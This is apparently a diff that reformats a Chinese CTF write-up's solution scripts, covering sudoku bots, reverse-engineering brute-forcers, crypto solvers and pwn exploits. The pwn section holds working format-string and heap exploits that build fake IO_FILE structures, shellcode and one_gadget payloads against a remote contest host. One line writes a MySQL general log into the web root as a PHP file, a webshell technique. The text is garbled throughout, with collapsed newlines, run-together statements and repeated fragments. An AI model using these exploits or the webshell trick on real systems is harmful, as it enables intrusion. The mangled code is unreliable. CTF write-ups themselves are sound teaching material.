@@ -26,8 +26,20 @@ def parse_input(input_list): board = []
  for row in input_list: nums = list(map(int, row)) board.append(nums)
  return board
 def format_output(board): formatted = "" for row in board: formatted += "".join(map(str, row)) + "n" return formatted.strip()
-# input_string = '''---------------------# 800103720# 023840650# 410006008# 300001062# 000052407# 072060090# 160000375# 205019846# 000030000# ---------------------# now give me you solve:'''
-# lists=input_string.split('n')[1:10]# board = parse_input(lists)# print(board)# solve(board)# print(board)
+# input_string = '''---------------------# 800103720
+# 023840650
+# 410006008
+# 300001062
+# 000052407
+# 072060090
+# 160000375
+# 205019846
+# 000030000
+# ---------------------# now give me you solve:'''
+# lists=input_string.split('n')[1:10]# board = parse_input(lists)
+# print(board)
+# solve(board)
+# print(board)
 from pwn import *
 # 创建连接conn = remote('47.108.165.60',27539)
 # 接收欢迎信息for i in range(7): msg = conn.recvuntil("Please input:").strip().decode("utf-8") print(msg) # 发送选择 conn.sendline('1'.encode())
@@ -41,7 +53,8 @@ kali :: ~ 127 » telnet 47.108.165.60 37569Trying 47.108.165.60...Connected to 4
 Ubuntu 22.04.2 LTSWelcome to Play Sudoku Game!Play(1)Exit(2)Please input> 1
 Tips:R to replayQ to exitWASD to moveYou have 10000ms to solve it :)Please select the leveleasy(5)normal(6)hard(7)>5
 
-def solve(input_string): original_board = parse_input(input_string)# 创建原始数组的副本 board_copy = [row[:] for row in original_board]
+def solve(input_string): original_board = parse_input(input_string)
+# 创建原始数组的副本 board_copy = [row[:] for row in original_board]
 
  solution = solve_sudoku(original_board) # print(board_copy) # print(solution) lists=[] for i in range(9): for j in range(9): if board_copy[i][j] == 0: lists.append(str(solution[i][j])) if j != 8: lists.append('d') lists.extend('saaaaaaaa') # print(f"索引为 ({i}, {j}) 的位置，填入数字 {solution[i][j]}") return lists
 
@@ -51,7 +64,8 @@ def parse_input(input_string): rows = input_string.strip().split('n') board = []
  for row in rows: row = row.replace('-', '').replace('|', '').split() nums = [int(num) if num != '0' else 0 for num in row] if nums!=[]: board.append(nums)
  return board
 
-import telnetlibdef solve_sudoku(board): if is_complete(board): return board
+import telnetlib
+def solve_sudoku(board): if is_complete(board): return board
  row, col = find_empty_cell(board) for num in range(1, 10): if is_valid(board, row, col, num): board[row][col] = num if solve_sudoku(board): return board board[row][col] = 0
  return None
 def is_complete(board): for row in board: if 0 in row: return False return True
@@ -63,7 +77,8 @@ def is_valid(board, row, col, num): # Check row if num in board[row]: return Fal
 def parse_input(input_string): rows = input_string.strip().split('n') board = []
  for row in rows: row = row.replace('-', '').replace('|', '').split() nums = [int(num) if num != '0' else 0 for num in row] if nums!=[]: board.append(nums)
  return board
-def solve(input_string): original_board = parse_input(input_string)# 创建原始数组的副本 board_copy = [row[:] for row in original_board]
+def solve(input_string): original_board = parse_input(input_string)
+# 创建原始数组的副本 board_copy = [row[:] for row in original_board]
 
  solution = solve_sudoku(original_board) # print(board_copy) # print(solution) lists = [] for i in range(9): for j in range(9): if board_copy[i][j] == 0: lists.append(str(solution[i][j])) if j != 8: lists.append('d') lists.extend('saaaaaaaa') # print(f"索引为 ({i}, {j}) 的位置，填入数字 {solution[i][j]}") return lists
 tn = telnetlib.Telnet('47.108.165.60',36697)
@@ -77,24 +92,36 @@ import librosaimport soundfile as sfimport numpy as np
 audio1, sr1 = librosa.load('2.wav', sr=None)audio2, sr2 = librosa.load('3.wav', sr=None)
 result = 2*audio1-audio2sf.write('result.wav', result, sr1)
 
-.text:00413CFA jmp short loc_413D19.text:00413CFA ; ---------------------------------------------------------------------------.text:00413D19 loc_413D19: ; CODE XREF: .text:00413CFA↑j.text:00413D19 push ecx.text:00413D1A nop.text:00413D1B call ds:__imp_exit
+.text:
+00413CFA jmp short loc_413D19.text:
+00413CFA ; ---------------------------------------------------------------------------.text:
+00413D19 loc_413D19: ; CODE XREF: .text:
+00413CFA↑j.text:
+00413D19 push ecx.text:
+00413D1A nop.text:
+00413D1B call ds:
+__imp_exit
 
 import stringimport osimport time
-table = string.ascii_letters+string.digits+'!-{}'# table = string.printable# 'SYC{Y3S-yE5-y0u-S0Ve-Th3-C9P!!!}'theflag = ''while len(theflag) < 32: for ch in table: flag = (theflag+ch).ljust(32, '#') exitcode = os.system(f"echo {flag} | ez_cpp3.exe 1>&0") if exitcode >= len(theflag) + 1: theflag += ch print(theflag, exitcode) break else: print('not found') time.sleep(0.1)
+table = string.ascii_letters+string.digits+'!-{}'# table = string.printable
+# 'SYC{Y3S-yE5-y0u-S0Ve-Th3-C9P!!!}'theflag = ''while len(theflag) < 32: for ch in table: flag = (theflag+ch).ljust(32, '#') exitcode = os.system(f"echo {flag} | ez_cpp3.exe 1>&0") if exitcode >= len(theflag) + 1: theflag += ch print(theflag, exitcode) break else: print('not found') time.sleep(0.1)
 
 m = ['#', ' ', '2', '$', '3', '@', '5']
 for level in range(6): print('level', level) for y in range(10): line = '' for x in range(10): n = ida_bytes.get_dword(0x140005040+(level*100+y*10+x)*4) line += m[n] print(line)
 
-level 0 跳 1-?-0## ######### #### #### # #### # ####### # *衔接1 wddwwdddddD## # ####### *衔接1 ##4# ########$#########*###### w
+level 0 跳 1-?-0## ######### #### #### # #### # ####### # *衔接1 wddwwdddddD## # ####### *衔接1 ##4
+# ########$#########*###### w
 level 5 可以跳回 0-9-3###*######### ######### ######### ######### ######## ######## #######* ####### ddwwdwwwwwW####################
-level 1########### ###### ## *衔接2 dwwwdddsdddddD# ########* ##################* ###################################
+level 1########### ###### ## *衔接2 dwwwdddsdddddD
+# ########* ##################* ###################################
 level 3 可以跳到5-7-0##*####### sssssssssS## ######### # ###### ## ##### ######## ######## ## ##### # ###### #########*#######
 level 2 可以跳到4-0-9*######### wwW #########*## # ### ## # # # ### #### ##### ### ###### ## #### # ## ##### ### ############
 level 4 可以跳3-0-2######## * 从2过来 ######## #* # assaaaaaaaaA######################################################################
 
 00000000000111111111111112224444444444443333333333555555555550wddwwdddddDdwwwdddsdddddDwwWassaaaaaaaaAsssssssssSddwwdwwwwwWw
 
-import ctypesfrom Crypto.Cipher import ARC4from hashlib import md5
+import ctypesfrom Crypto.Cipher import ARC4
+from hashlib import md5
 libc = ctypes.CDLL("ucrtbase.dll")libc.srand.argtypes = [ctypes.c_uint]libc.rand.restype = ctypes.c_int
 srand = libc.srandrand = libc.rand
 srand(0x94307F97)seed_list = []for i in range(361): seed_list.append(rand())
@@ -105,10 +132,12 @@ def enc(buf, size, seed): srand(seed) keysize = int(rand()*1.0/32767.0 * 256.0) 
 foods = []for i in range(361): srand(seed_list[i]) while 1: y = rand() % 20 x = rand() % 20 if not (x == 0 or x == 19 or y == 0 or y == 19): # print(i, y, x) foods.append((y, x)) break
 
 tmp = 0x92
-data = b'x02'for i in range(2): data += bytes([data[-1] ^ 0xBE])# print(data.hex())
+data = b'x02'for i in range(2): data += bytes([data[-1] ^ 0xBE])
+# print(data.hex())
 flag_data = data[:]eat_count = 361 # 初始长度就是3, 但是要求吃361个 ???for i in range(eat_count): y, x = foods[i] pos = y << 8 | x data = enc(data, 3+i, pos) # print(data.hex())
  _tmp = tmp # print(hex(tmp-1), hex(data[0]-1)) tmp = ((tmp-1) ^ (data[0]-1)) & 0xFF flag_data = data[:] data = data[::-1] data += bytes([_tmp]) # print(hex(tmp))
-s = flag_data.ljust(361, b'x00').hex().encode()print('flag_data', len(flag_data))print('SYC{'+md5(s[:722]).hexdigest()+'}')
+s = flag_data.ljust(361, b'x00').hex().encode()print('flag_data', len(flag_data))print('SYC{'+md5(s[:
+722]).hexdigest()+'}')
 
 0129FE14 53 59 43 7B 54 68 31 73 5F 69 73 5F 40 5F 45 61 SYC{Th1s_is_@_Ea 0129FE24 73 59 5F 33 6E 63 72 79 70 74 4F 21 21 21 21 7D sY_3ncryptO!!!!}
 
@@ -151,7 +180,8 @@ sa(b'input your data ;)n', f'%{ra&0xffff}c%15$hn '.encode())sa(b'input your data
 sa(b'input your data ;)n', f'%{(printf_arginfo + 2) & 0xff}c%45$hhn '.encode())sa(b'input your data ;)n', f'%{(heap >> 16)&0xffff}c%11$hn '.encode())
 sa(b'input your data ;)n', f'%{(printf_arginfo + 4) & 0xff}c%45$hhn '.encode())sa(b'input your data ;)n', f'%{(heap >> 32)&0xffff}c%11$hn '.encode())
 sa(b'input your data ;)n', f'%{printf_functable & 0xffff}c%45$hn '.encode())sa(b'input your data ;)n', b'A%11$hhn ')
-import subprocessdef get_one_gadgets(): one_gadgets = [int(i) + libc.address for i in subprocess.check_output(['one_gadget', '-l', '1', '--raw', libcname]).decode().split(' ')] debug(f'search one gadgets from {libcname}: {[hex(i) for i in one_gadgets]}') return one_gadgets
+import subprocess
+def get_one_gadgets(): one_gadgets = [int(i) + libc.address for i in subprocess.check_output(['one_gadget', '-l', '1', '--raw', libcname]).decode().split(' ')] debug(f'search one gadgets from {libcname}: {[hex(i) for i in one_gadgets]}') return one_gadgets
 import syssa(b'input your data ;)n', b'%A'.ljust(8, b' ') + p64(get_one_gadgets()[int(sys.argv[1])]) * 0x41)
 ia()
 
@@ -169,7 +199,8 @@ def free(idx): op(2) sidx(idx)
 add(0x90, b' ')add(0x90, b'1')free(0)add(0x90, b' ')show(0)heap = leakaddr(pre=b'context:n') << 12success(f'leak heap: {hex(heap)}')free(0)free(1)
 fake_chunk = heap + 0x3e0
 add(0xf10, rop([0, 0x1EA1, fake_chunk, fake_chunk]))add(0xef0, b'1')add(0x88, b'2')add(0xef0, b'3')add(0xa0, b'4')
-edit(2, b'a' * 0x80 + p64(0x1EA0))# pause()free(3)
+edit(2, b'a' * 0x80 + p64(0x1EA0))
+# pause()free(3)
 show(0)libc.address = leakaddr(suf=b'x7f', off=0x219CE0)success(f'leak libc.address: {hex(libc.address)}')
 pause()
 add(0x300, b'3')add(0x300, b'5')
@@ -253,7 +284,7 @@ k_3p=P-M,k_4q=Q-m,k_5r=R-m\
 P*Q*R-m^3-m*(P-m)*(Q-m)-m^2*((P-m)+(Q-m))-(R-m)*m^2-m*((P-m)+(Q-m))*(R-m)equiv 0 pmod nqquadtext{(2)}$$
 
 from Crypto.Util.number import *
-import gmpy2 
+import gmpy2
 #coppersmith
 clown = 128259792862716016839189459678072057136816726330154776961595353705839428880480571473066446384217522987161777524953373380960754160008765782711874445778198828395697797884436326877471408867745183652189648661444125231444711655242478825995283559948683891100547458186394738621410655721556196774451473359271887941209
 trick = 13053422630763887754872929794631414002868675984142851995620494432706465523574529389771830464455212126838976863742628716168391373019631629866746550551576576
@@ -296,7 +327,9 @@ m = gmpy2.powmod(c,d,n)
 print(m)
 print(long_to_bytes(m))
 
-from random import randintimport gmpy2 as gpfrom Crypto.Util.number import *from Crypto.Cipher import AESfrom hashlib import md5from binascii import *
+from random import randintimport gmpy2 as gpfrom Crypto.Util.number import *from Crypto.Cipher import AES
+from hashlib import md5
+from binascii import *
 from tqdm import tqdm
 a = 12760960185046114319373228302773710922517145043260117201359198182268919830481221094839217650474599663154368235126389153552714679678111020813518413419360215b = 10117047970182219839870108944868089481578053385699469522500764052432603914922633010879926901213308115011559044643704414828518671345427553143525049573118673m = 9088893209826896798482468360055954173455488051415730079879005756781031305351828789190798690556659137238815575046440957403444877123534779101093800357633817seq = [1588310287911121355041550418963977300431302853564488171559751334517653272107112155026823633337984299690660859399029380656951654033985636188802999069377064, 12201509401878255828464211106789096838991992385927387264891565300242745135291213238739979123473041322233985445125107691952543666330443810838167430143985860, 13376619124234470764612052954603198949430905457204165522422292371804501727674375468020101015195335437331689076325941077198426485127257539411369390533686339, 8963913870279026075472139673602507483490793452241693352240197914901107612381260534267649905715779887141315806523664366582632024200686272718817269720952005, 5845978735386799769835726908627375251246062617622967713843994083155787250786439545090925107952986366593934283981034147414438049040549092914282747883231052, 9415622412708314171894809425735959412573511070691940566563162947924893407832253049839851437576026604329005326363729310031275288755753545446611757793959050, 6073533057239906776821297586403415495053103690212026150115846770514859699981321449095801626405567742342670271634464614212515703417972317752161774065534410, 3437702861547590735844267250176519238293383000249830711901455900567420289208826126751013809630895097787153707874423814381309133723519107897969128258847626, 2014101658279165374487095121575610079891727865185371304620610778986379382402770631536432571479533106528757155632259040939977258173977096891411022595638738, 10762035186018188690203027733533410308197454736009656743236110996156272237959821985939293563176878272006006744403478220545074555281019946284069071498694967]ct = 0x37dc072bdf4cdc7e9753914c20cbf0b55c20f03249bacf37c88f66b10b72e6e678940eecdb4c0be8466f68fdcd13bd81
 n = 2023
@@ -312,20 +345,10 @@ set global general_log_file='/var/www/html/sEcR@t_n@Bodyknow.php'
 
 ```
 -——————– 800103720 023840650 410006008 300001062 000052407 072060090 160000375 205019846 000030000 -——————–
-```
-
-
-
-```
 def parse_input(input_list): board = []
  for row in input_list: nums = list(map(int, row)) board.append(nums)
  return board
 def format_output(board): formatted = "" for row in board: formatted += "".join(map(str, row)) + "n" return formatted.strip()
-```
-
-
-
-```
 def find_empty(board): for row in range(9): for col in range(9): if board[row][col] == 0: return row, col return None
 
 def is_valid(board, num, pos): row, col = pos for i in range(9): if board[row][i] == num and col != i: return False if board[i][col] == num and row != i: return False
@@ -342,8 +365,20 @@ def parse_input(input_list): board = []
  for row in input_list: nums = list(map(int, row)) board.append(nums)
  return board
 def format_output(board): formatted = "" for row in board: formatted += "".join(map(str, row)) + "n" return formatted.strip()
-# input_string = '''---------------------# 800103720# 023840650# 410006008# 300001062# 000052407# 072060090# 160000375# 205019846# 000030000# ---------------------# now give me you solve:'''
-# lists=input_string.split('n')[1:10]# board = parse_input(lists)# print(board)# solve(board)# print(board)
+# input_string = '''---------------------# 800103720
+# 023840650
+# 410006008
+# 300001062
+# 000052407
+# 072060090
+# 160000375
+# 205019846
+# 000030000
+# ---------------------# now give me you solve:'''
+# lists=input_string.split('n')[1:10]# board = parse_input(lists)
+# print(board)
+# solve(board)
+# print(board)
 from pwn import *
 # 创建连接conn = remote('47.108.165.60',27539)
 # 接收欢迎信息for i in range(7): msg = conn.recvuntil("Please input:").strip().decode("utf-8") print(msg) # 发送选择 conn.sendline('1'.encode())
@@ -352,42 +387,19 @@ from pwn import *
  msg = conn.recvuntil("clock start").strip().decode("utf-8") print(msg) time.sleep(5)
  msg = conn.recvuntil("now give me you solve:").strip().decode("utf-8") print(msg) lists = msg.split('n')[1:10] board = parse_input(lists) solve(board) solved = format_output(board) conn.sendline(solved.encode())
 conn.interactive()getflag
-```
-
-
-
-```
 kali :: ~ 127 » telnet 47.108.165.60 37569Trying 47.108.165.60...Connected to 47.108.165.60.Escape character is '^]'.
 Ubuntu 22.04.2 LTSWelcome to Play Sudoku Game!Play(1)Exit(2)Please input> 1
 Tips:R to replayQ to exitWASD to moveYou have 10000ms to solve it :)Please select the leveleasy(5)normal(6)hard(7)>5
-```
-
-
-
-```
-def solve(input_string): original_board = parse_input(input_string)# 创建原始数组的副本 board_copy = [row[:] for row in original_board]
+def solve(input_string): original_board = parse_input(input_string)
+# 创建原始数组的副本 board_copy = [row[:] for row in original_board]
 
  solution = solve_sudoku(original_board) # print(board_copy) # print(solution) lists=[] for i in range(9): for j in range(9): if board_copy[i][j] == 0: lists.append(str(solution[i][j])) if j != 8: lists.append('d') lists.extend('saaaaaaaa') # print(f"索引为 ({i}, {j}) 的位置，填入数字 {solution[i][j]}") return lists
-```
-
-
-
-```
 -———————— 4 3 0 | 0 0 6 | 2 0 0 | 8 0 0 | 0 7 0 | 0 0 3 | 2 0 7 | 0 5 0 | 1 4 6 | -———————— 0 0 0 | 0 0 0 | 0 7 5 | 7 5 0 | 8 0 0 | 6 2 0 | 0 2 9 | 7 3 5 | 0 1 0 | -———————— 5 6 0 | 4 0 3 | 0 9 0 | 0 0 2 | 5 0 0 | 8 0 0 | 3 0 1 | 0 8 2 | 0 6 4 |
-```
-
-
-
-```
 def parse_input(input_string): rows = input_string.strip().split('n') board = []
  for row in rows: row = row.replace('-', '').replace('|', '').split() nums = [int(num) if num != '0' else 0 for num in row] if nums!=[]: board.append(nums)
  return board
-```
-
-
-
-```
-import telnetlibdef solve_sudoku(board): if is_complete(board): return board
+import telnetlib
+def solve_sudoku(board): if is_complete(board): return board
  row, col = find_empty_cell(board) for num in range(1, 10): if is_valid(board, row, col, num): board[row][col] = num if solve_sudoku(board): return board board[row][col] = 0
  return None
 def is_complete(board): for row in board: if 0 in row: return False return True
@@ -399,7 +411,8 @@ def is_valid(board, row, col, num): # Check row if num in board[row]: return Fal
 def parse_input(input_string): rows = input_string.strip().split('n') board = []
  for row in rows: row = row.replace('-', '').replace('|', '').split() nums = [int(num) if num != '0' else 0 for num in row] if nums!=[]: board.append(nums)
  return board
-def solve(input_string): original_board = parse_input(input_string)# 创建原始数组的副本 board_copy = [row[:] for row in original_board]
+def solve(input_string): original_board = parse_input(input_string)
+# 创建原始数组的副本 board_copy = [row[:] for row in original_board]
 
  solution = solve_sudoku(original_board) # print(board_copy) # print(solution) lists = [] for i in range(9): for j in range(9): if board_copy[i][j] == 0: lists.append(str(solution[i][j])) if j != 8: lists.append('d') lists.extend('saaaaaaaa') # print(f"索引为 ({i}, {j}) 的位置，填入数字 {solution[i][j]}") return lists
 tn = telnetlib.Telnet('47.108.165.60',36697)
@@ -408,53 +421,35 @@ welcome_msg = tn.read_until(b"Please input")print(welcome_msg.decode("utf-8"))
 msg = tn.read_until(b"hard(7)")print(msg.decode("utf-8"))
 tn.write("5".encode("utf-8") + b"n")
 msg = ''for i in range(15): response = tn.read_until(b"n") # print((response)) response = response.replace(b'x1b[7;32m',b'').replace(b'x1b[0m',b'').replace(b'x1b[1;32m',b'').replace(b'x1b[Hx1b[2J',b'') msg += response.decode().strip('> 5')tn.write(str(solve(msg)).encode("utf-8") + b"n")tn.interact()
-```
-
-
-
-```
 import librosaimport soundfile as sfimport numpy as np
 audio1, sr1 = librosa.load('2.wav', sr=None)audio2, sr2 = librosa.load('3.wav', sr=None)
 result = 2*audio1-audio2sf.write('result.wav', result, sr1)
-```
-
-
-
-```
-.text:00413CFA jmp short loc_413D19.text:00413CFA ; ---------------------------------------------------------------------------.text:00413D19 loc_413D19: ; CODE XREF: .text:00413CFA↑j.text:00413D19 push ecx.text:00413D1A nop.text:00413D1B call ds:__imp_exit
-```
-
-
-
-```
+.text:
+00413CFA jmp short loc_413D19.text:
+00413CFA ; ---------------------------------------------------------------------------.text:
+00413D19 loc_413D19: ; CODE XREF: .text:
+00413CFA↑j.text:
+00413D19 push ecx.text:
+00413D1A nop.text:
+00413D1B call ds:
+__imp_exit
 import stringimport osimport time
-table = string.ascii_letters+string.digits+'!-{}'# table = string.printable# 'SYC{Y3S-yE5-y0u-S0Ve-Th3-C9P!!!}'theflag = ''while len(theflag) < 32: for ch in table: flag = (theflag+ch).ljust(32, '#') exitcode = os.system(f"echo {flag} | ez_cpp3.exe 1>&0") if exitcode >= len(theflag) + 1: theflag += ch print(theflag, exitcode) break else: print('not found') time.sleep(0.1)
-```
-
-
-
-```
+table = string.ascii_letters+string.digits+'!-{}'# table = string.printable
+# 'SYC{Y3S-yE5-y0u-S0Ve-Th3-C9P!!!}'theflag = ''while len(theflag) < 32: for ch in table: flag = (theflag+ch).ljust(32, '#') exitcode = os.system(f"echo {flag} | ez_cpp3.exe 1>&0") if exitcode >= len(theflag) + 1: theflag += ch print(theflag, exitcode) break else: print('not found') time.sleep(0.1)
 m = ['#', ' ', '2', '$', '3', '@', '5']
 for level in range(6): print('level', level) for y in range(10): line = '' for x in range(10): n = ida_bytes.get_dword(0x140005040+(level*100+y*10+x)*4) line += m[n] print(line)
-```
-
-
-
-```
-level 0 跳 1-?-0## ######### #### #### # #### # ####### # *衔接1 wddwwdddddD## # ####### *衔接1 ##4# ########$#########*###### w
+level 0 跳 1-?-0## ######### #### #### # #### # ####### # *衔接1 wddwwdddddD## # ####### *衔接1 ##4
+# ########$#########*###### w
 level 5 可以跳回 0-9-3###*######### ######### ######### ######### ######## ######## #######* ####### ddwwdwwwwwW####################
-level 1########### ###### ## *衔接2 dwwwdddsdddddD# ########* ##################* ###################################
+level 1########### ###### ## *衔接2 dwwwdddsdddddD
+# ########* ##################* ###################################
 level 3 可以跳到5-7-0##*####### sssssssssS## ######### # ###### ## ##### ######## ######## ## ##### # ###### #########*#######
 level 2 可以跳到4-0-9*######### wwW #########*## # ### ## # # # ### #### ##### ### ###### ## #### # ## ##### ### ############
 level 4 可以跳3-0-2######## * 从2过来 ######## #* # assaaaaaaaaA######################################################################
 
 00000000000111111111111112224444444444443333333333555555555550wddwwdddddDdwwwdddsdddddDwwWassaaaaaaaaAsssssssssSddwwdwwwwwWw
-```
-
-
-
-```
-import ctypesfrom Crypto.Cipher import ARC4from hashlib import md5
+import ctypesfrom Crypto.Cipher import ARC4
+from hashlib import md5
 libc = ctypes.CDLL("ucrtbase.dll")libc.srand.argtypes = [ctypes.c_uint]libc.rand.restype = ctypes.c_int
 srand = libc.srandrand = libc.rand
 srand(0x94307F97)seed_list = []for i in range(361): seed_list.append(rand())
@@ -465,21 +460,13 @@ def enc(buf, size, seed): srand(seed) keysize = int(rand()*1.0/32767.0 * 256.0) 
 foods = []for i in range(361): srand(seed_list[i]) while 1: y = rand() % 20 x = rand() % 20 if not (x == 0 or x == 19 or y == 0 or y == 19): # print(i, y, x) foods.append((y, x)) break
 
 tmp = 0x92
-data = b'x02'for i in range(2): data += bytes([data[-1] ^ 0xBE])# print(data.hex())
+data = b'x02'for i in range(2): data += bytes([data[-1] ^ 0xBE])
+# print(data.hex())
 flag_data = data[:]eat_count = 361 # 初始长度就是3, 但是要求吃361个 ???for i in range(eat_count): y, x = foods[i] pos = y << 8 | x data = enc(data, 3+i, pos) # print(data.hex())
  _tmp = tmp # print(hex(tmp-1), hex(data[0]-1)) tmp = ((tmp-1) ^ (data[0]-1)) & 0xFF flag_data = data[:] data = data[::-1] data += bytes([_tmp]) # print(hex(tmp))
-s = flag_data.ljust(361, b'x00').hex().encode()print('flag_data', len(flag_data))print('SYC{'+md5(s[:722]).hexdigest()+'}')
-```
-
-
-
-```
+s = flag_data.ljust(361, b'x00').hex().encode()print('flag_data', len(flag_data))print('SYC{'+md5(s[:
+722]).hexdigest()+'}')
 0129FE14 53 59 43 7B 54 68 31 73 5F 69 73 5F 40 5F 45 61 SYC{Th1s_is_@_Ea 0129FE24 73 59 5F 33 6E 63 72 79 70 74 4F 21 21 21 21 7D sY_3ncryptO!!!!}
-```
-
-
-
-```
 from claripy import *from libnum import *
 
 tmp_flag = [BVS(f'flag{i}', 8) for i in range(30)]# x_flag = b'111111111122222222223333333333'# tmp_flag = [BVV(x_flag[i], 8) for i in range(30)]flag = Concat(*tmp_flag)unk = 9
@@ -497,23 +484,8 @@ for i in range(30): solve.add(enc_flag[i] == tmp_flag[i])
 
 for k in solve.eval(flag, 2): print(n2s(k))
 # b'SYC{I_h0pE_you_cAn_FInd_d4eam}'
-```
-
-
-
-```
 unsigned int fin[36] = { 0x0003B148, 0x000D2CAE, 0x0003A1FB, 0x00044F40, 0x000472DE, 0x0000CCC0, 0x00001888, 0x00003B80, 0x000702F7, 0x000C745C, 0x000658E0, 0x000858D4, 0x0000D5BD, 0x00004860, 0x0014F410, 0x0002CB9F, 0x000321DB, 0x0014D534, 0x00025DA0, 0x0006898C, 0x00123D56, 0x00058E4D, 0x00050CF8, 0x00005D64, 0x000978BA, 0x0008F290, 0x0003B568, 0x00054696, 0x00094C12, 0x0001021F, 0x000DBACB, 0x00049680, 0x0002FABD, 0x000F2B58, 0x0012D23C, 0x0014AED3 }; unsigned long mul[36] = { 0x0000000000000D21, 0x000000000000009D, 0x000000000000094B, 0x00000000000003C9, 0x0000000000000C3F, 0x00000000000017E9, 0x000000000000130E, 0x0000000000000088,0x0000000000000486, 0x000000000000202F, 0x0000000000002230, 0x00000000000024B4, 0x00000000000008B1, 0x0000000000000A9F, 0x0000000000001AD2, 0x00000000000023EB, 0x0000000000000C7E, 0x000000000000042B, 0x00000000000005BF, 0x000000000000113C,0x0000000000000449, 0x0000000000001751, 0x0000000000000ACE, 0x0000000000001894, 0x000000000000208A, 0x0000000000000E82, 0x00000000000006BD, 0x0000000000000CEE,0x0000000000002386, 0x00000000000013D4, 0x0000000000000111, 0x0000000000000D1C, 0x000000000000238E, 0x0000000000001759, 0x000000000000012B, 0x000000000000214D }; unsigned char flag[40] = { 0 }; unsigned long* a = &mul[18]; for (int i = 0; i < 36; i += 6) { flag[i] = fin[i] / (*(a - 18)); flag[i + 1] = fin[i + 1] / (*(a - 12)); flag[i + 2] = fin[i + 2] / (*(a - 6)); flag[i + 3] = fin[i + 3] / (*(a)); flag[i + 4] = fin[i + 4] / (*(a + 6)); flag[i + 5] = fin[i + 5] / (*(a + 12)); a++; } int j = 0; for (int i = 35; i >= 0; --i) { flag[i] ^= flag[j++]; flag[i] = ((flag[i] >> 4) | (flag[i] << 4)) & 0xff; } printf("%s", flag);
-```
-
-
-
-```
 p.recvuntil(' game!n')p.send(b'a'*28+p32(0))rand_list=[1804289348,846930915,1681692750,1714636888,1957747830,424238300,719885423,1649760457,596516622,1189641450,1025202335,1350490000,783368663,1102520032,2044897736,1967513955,1365180505,1540383463,304089201,1303455709,35005248]for i in range(len(rand_list)):p.recvuntil('input:')p.sendline(str(rand_list[i]))
-```
-
-
-
-```
 from pwn import *context(os='linux', arch='amd64')#, log_level='debug')
 procname = './pwn'libcname = './libc.so.6'
 # io = process(procname, stdin=PTY)io = remote('47.108.165.60', 47744)elf = ELF(procname)libc = ELF(libcname)
@@ -531,14 +503,10 @@ sa(b'input your data ;)n', f'%{ra&0xffff}c%15$hn '.encode())sa(b'input your data
 sa(b'input your data ;)n', f'%{(printf_arginfo + 2) & 0xff}c%45$hhn '.encode())sa(b'input your data ;)n', f'%{(heap >> 16)&0xffff}c%11$hn '.encode())
 sa(b'input your data ;)n', f'%{(printf_arginfo + 4) & 0xff}c%45$hhn '.encode())sa(b'input your data ;)n', f'%{(heap >> 32)&0xffff}c%11$hn '.encode())
 sa(b'input your data ;)n', f'%{printf_functable & 0xffff}c%45$hn '.encode())sa(b'input your data ;)n', b'A%11$hhn ')
-import subprocessdef get_one_gadgets(): one_gadgets = [int(i) + libc.address for i in subprocess.check_output(['one_gadget', '-l', '1', '--raw', libcname]).decode().split(' ')] debug(f'search one gadgets from {libcname}: {[hex(i) for i in one_gadgets]}') return one_gadgets
+import subprocess
+def get_one_gadgets(): one_gadgets = [int(i) + libc.address for i in subprocess.check_output(['one_gadget', '-l', '1', '--raw', libcname]).decode().split(' ')] debug(f'search one gadgets from {libcname}: {[hex(i) for i in one_gadgets]}') return one_gadgets
 import syssa(b'input your data ;)n', b'%A'.ljust(8, b' ') + p64(get_one_gadgets()[int(sys.argv[1])]) * 0x41)
 ia()
-```
-
-
-
-```
 from pwn import *context(os='linux', arch='amd64')#, log_level='debug')
 procname = './pwn'libcname = './libc.so.6'
 # io = process(procname, stdin=PTY)io = remote('47.108.165.60', 22692)elf = ELF(procname)libc = ELF(libcname)
@@ -553,7 +521,8 @@ def free(idx): op(2) sidx(idx)
 add(0x90, b' ')add(0x90, b'1')free(0)add(0x90, b' ')show(0)heap = leakaddr(pre=b'context:n') << 12success(f'leak heap: {hex(heap)}')free(0)free(1)
 fake_chunk = heap + 0x3e0
 add(0xf10, rop([0, 0x1EA1, fake_chunk, fake_chunk]))add(0xef0, b'1')add(0x88, b'2')add(0xef0, b'3')add(0xa0, b'4')
-edit(2, b'a' * 0x80 + p64(0x1EA0))# pause()free(3)
+edit(2, b'a' * 0x80 + p64(0x1EA0))
+# pause()free(3)
 show(0)libc.address = leakaddr(suf=b'x7f', off=0x219CE0)success(f'leak libc.address: {hex(libc.address)}')
 pause()
 add(0x300, b'3')add(0x300, b'5')
@@ -568,11 +537,6 @@ payload = fake_io_file + bytes(frame) + asm(code) + b' ' * 10
 add(0x300, payload)
 add(0x300, p64(fake_io_addr))
 ia()
-```
-
-
-
-```
 import gmpy2
 from Crypto.Util.number import long_to_bytes
 
@@ -622,51 +586,21 @@ d = gmpy2.invert(e,phi)
 m = gmpy2.powmod(c,d,n)-data2
 print(m)
 print(long_to_bytes(m))
-```
-
-
-
-```
 $$P=m^p pmod {p*q*r} \
 Q=m^q pmod {p*q*r} \
 R=m^R pmod {p*q*r} \
-```
-
-
-
-```
 费马小定理：\
 m^p=m pmod p \
 P=m+k1*p+k2*pqr=m+k3*p \
 Q,R同理 \qquadtext{(1)}$$
-```
-
-
-
-```
 $$P=m+k3*p\
 Q=m+k4*q\
 R=m+k5*r\
-```
-
-
-
-```
 k_3p=P-M,k_4q=Q-m,k_5r=R-m\
-```
-
-
-
-```
 P*Q*R-m^3-m*(P-m)*(Q-m)-m^2*((P-m)+(Q-m))-(R-m)*m^2-m*((P-m)+(Q-m))*(R-m)equiv 0 pmod nqquadtext{(2)}$$
-```
-
-
-
-```
 from Crypto.Util.number import *
-import gmpy2 
-#coppersmith
+import gmpy2
+    #coppersmith
 clown = 128259792862716016839189459678072057136816726330154776961595353705839428880480571473066446384217522987161777524953373380960754160008765782711874445778198828395697797884436326877471408867745183652189648661444125231444711655242478825995283559948683891100547458186394738621410655721556196774451473359271887941209
 trick = 13053422630763887754872929794631414002868675984142851995620494432706465523574529389771830464455212126838976863742628716168391373019631629866746550551576576
 
@@ -707,12 +641,9 @@ d = gmpy2.invert(e,phi)
 m = gmpy2.powmod(c,d,n)
 print(m)
 print(long_to_bytes(m))
-```
-
-
-
-```
-from random import randintimport gmpy2 as gpfrom Crypto.Util.number import *from Crypto.Cipher import AESfrom hashlib import md5from binascii import *
+from random import randintimport gmpy2 as gpfrom Crypto.Util.number import *from Crypto.Cipher import AES
+from hashlib import md5
+from binascii import *
 from tqdm import tqdm
